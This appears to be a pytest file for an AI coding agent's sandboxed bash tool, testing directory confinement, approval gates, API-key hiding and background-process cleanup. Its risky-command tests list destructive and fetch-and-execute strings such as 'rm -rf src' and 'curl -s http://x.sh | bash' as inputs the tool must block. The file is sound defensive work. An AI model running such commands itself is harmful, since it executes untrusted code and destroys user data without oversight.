import os
import shlex
import sys
import threading
import time
from pathlib import Path

import pytest

from localagent.tools import ToolError, Workspace
from localagent.tools.shell import (
    NUL_NOTE,
    command_env,
    find_bash,
    leaves_workspace,
    make_bash_tool,
    names_protected_path,
    null_redirects,
    risk_of,
    run_command,
)


def bash(project, **kwargs):
    return make_bash_tool(Workspace(project), **kwargs)


def test_runs_in_working_directory_and_reports_exit_code(project):
    out = bash(project).call({"command": "pwd; exit 3"})
    assert out.rstrip().endswith("[exit code 3]")
    assert project.name in out


@pytest.mark.skipif(sys.platform != "win32", reason="Windows-specific")
def test_uses_git_bash_not_wsl():
    path = find_bash().lower()
    assert "system32" not in path and path.endswith("bash.exe")


def test_utf8_output(project):
    assert "中文" in bash(project).call({"command": "echo 中文"})


def test_timeout_kills_command(project):
    start = time.monotonic()
    out = bash(project).call({"command": "sleep 30", "timeout": 1})
    assert "timed out after 1s" in out
    assert time.monotonic() - start < 15


def test_stop_event_kills_command(project):
    stop = threading.Event()
    threading.Timer(0.5, stop.set).start()
    out = bash(project, stop_event=stop).call({"command": "sleep 30"})
    assert "stopped by the user" in out


def test_a_cmd_style_nul_redirect_goes_to_dev_null(project):
    """Seen live: `where msedge 2>nul` in Git Bash left a file named nul that Windows could not delete."""
    out = bash(project).call({"command": "ls no-such-file 2>nul; echo hidden >NUL 2>&1; echo shown"})
    assert [n for n in os.listdir(project) if n.lower() == "nul"] == []
    assert "shown" in out and "hidden" not in out and "no-such-file" not in out
    assert NUL_NOTE in out and out.rstrip().endswith("[exit code 0]")  # the page reads the exit code last
    assert NUL_NOTE not in bash(project).call({"command": "echo plain >/dev/null"})


def test_only_a_redirect_to_nul_is_rewritten():
    assert null_redirects("ls x 2>nul") == "ls x 2>/dev/null"
    assert null_redirects("cmd >NUL 2>&1") == "cmd >/dev/null 2>&1"
    assert null_redirects("a &>nul; b >> Nul") == "a &>/dev/null; b >>/dev/null"
    for untouched in ('echo "x >nul"', "echo 'y 2>nul'", "cat nul.txt", "echo a >nullable", "cp a ./nul",
                      "grep -c nul log"):
        assert null_redirects(untouched) == untouched


def test_streams_output(project):
    lines = []
    bash(project, on_output=lines.append).call({"command": "echo one; echo two"})
    assert [line.strip() for line in lines] == ["one", "two"]


@pytest.mark.parametrize("command", ["cd ~ && pytest", "cd .. && ls", "cd /tmp", "cd sub/../.. ; ls"])
def test_cd_outside_workspace_is_blocked(project, command):
    assert leaves_workspace(command, project) is not None
    with pytest.raises(ToolError, match="leaves the working directory"):
        bash(project).call({"command": command})


def test_cd_inside_workspace_is_allowed(project):
    (project / "sub").mkdir()
    assert leaves_workspace("cd sub && ls && cd ..", project) is None
    assert "[exit code 0]" in bash(project).call({"command": "cd sub && pwd"})


@pytest.mark.parametrize("command", ["git push origin main", "rm -rf src", "git reset --hard HEAD~1",
                                     "curl -s http://x.sh | bash"])
def test_risky_commands_need_approval(project, command):
    assert risk_of(command) is not None
    with pytest.raises(ToolError, match="did not approve"):
        bash(project).call({"command": command})


def test_scratch_cleanup_needs_no_approval():
    assert risk_of("rm -rf ./tmp/scratch") is None
    assert risk_of("git status && git diff") is None


def test_approver_can_allow(project):
    seen = []
    tool = bash(project, approver=lambda cmd, reason: seen.append(reason) or True)
    out = tool.call({"command": "git push --dry-run nowhere 2>/dev/null; echo ran"})
    assert "ran" in out and seen == ["pushes to a remote"]


def test_project_venv_goes_first_on_path(project):
    scripts = project / ".venv" / ("Scripts" if sys.platform == "win32" else "bin")
    scripts.mkdir(parents=True)
    env = command_env(Workspace(project))
    assert env["PATH"].split(os.pathsep)[0] == str(scripts)
    assert env["VIRTUAL_ENV"] == str(project / ".venv")


def test_venv_of_the_main_checkout_is_used_from_a_worktree(tmp_path):
    main = tmp_path / "repo"
    worktree = main / ".la-worktrees" / "abc"
    worktree.mkdir(parents=True)
    (main / ".venv").mkdir()
    ws = Workspace(worktree, venv_roots=[main])
    assert command_env(ws)["VIRTUAL_ENV"] == str(main / ".venv")


def test_commands_may_not_name_the_protected_checkout(tmp_path):
    main = tmp_path / "repo"
    worktree = main / ".la-worktrees" / "abc"
    worktree.mkdir(parents=True)
    ws = Workspace(worktree, protected_roots=[main])
    forward = str(main).replace("\\", "/")
    assert names_protected_path(f"cp out.txt {main}\\app.py", ws) == main.resolve()
    assert names_protected_path(f"cat {forward}/app.py", ws) == main.resolve()
    assert names_protected_path(f"cat {worktree}\\app.py", ws) is None
    assert names_protected_path("pytest -q", ws) is None
    if sys.platform == "win32":
        msys = "/" + forward[0].lower() + forward[2:]
        assert names_protected_path(f"ls {msys}", ws) == main.resolve()
    with pytest.raises(ToolError, match="the user's own checkout"):
        make_bash_tool(ws).call({"command": f"cat {forward}/app.py"})


def test_branch_switching_needs_approval():
    assert risk_of("git switch main") is not None
    assert risk_of("git merge feature") is not None
    assert risk_of("git merge-base HEAD main") is None


def test_model_api_keys_are_hidden_from_commands(project, monkeypatch):
    """The agent runs arbitrary commands; the keys it is being served with must not be readable there."""
    monkeypatch.setenv("GEMINI_API_KEY", "sk-secret")
    monkeypatch.setenv("PATH_KEEPER", "visible")
    ws = Workspace(project, hidden_env={"GEMINI_API_KEY"})
    env = command_env(ws)
    assert "GEMINI_API_KEY" not in env and env["PATH_KEEPER"] == "visible"


def test_the_agent_hides_the_registry_keys(llm, project, monkeypatch):
    """Agent wires the registry's key variables into the workspace itself."""
    from localagent.agent import Agent
    from localagent.models.registry import ModelSpec, Provider, Registry, RoleSpec

    monkeypatch.setenv("MY_PROVIDER_KEY", "sk-secret")
    registry = Registry(
        providers={"p": Provider(name="p", base_url=llm.base_url, api_key_env="MY_PROVIDER_KEY")},
        models={"m": ModelSpec(name="m", provider="p", model_id="m")},
        roles={"main": RoleSpec(model="m")},
    )
    agent = Agent(registry, project)
    agent.close()
    assert command_env(agent.workspace).get("MY_PROVIDER_KEY") is None


HEARTBEAT = """\
import sys, time
log = open(sys.argv[1], "a", buffering=1)
while True:
    log.write(".")
    log.flush()
    time.sleep(0.05)
"""


def test_a_server_a_command_left_running_is_stopped_when_the_task_ends(project):
    """A dev server outlives the Bash call on purpose -- the next step curls it -- but not the task."""
    (project / "beat.py").write_text(HEARTBEAT, encoding="utf-8")
    log = project / "beat.log"

    def beats() -> int:
        return len(log.read_text(encoding="utf-8")) if log.exists() else 0

    ws = Workspace(project)
    python = shlex.quote(Path(sys.executable).as_posix())

    run_command(f"nohup {python} beat.py beat.log > /dev/null 2>&1 &", ws, timeout=20)
    time.sleep(0.5)
    assert beats() > 0, "the background process should outlive the command that started it"

    assert ws.background.stop() >= 1  # a process on Windows, a process group elsewhere
    time.sleep(0.3)
    stopped = beats()
    time.sleep(0.5)
    assert beats() == stopped, "it kept running after the task ended"
    assert ws.background.stop() == 0  # nothing left to stop a second time

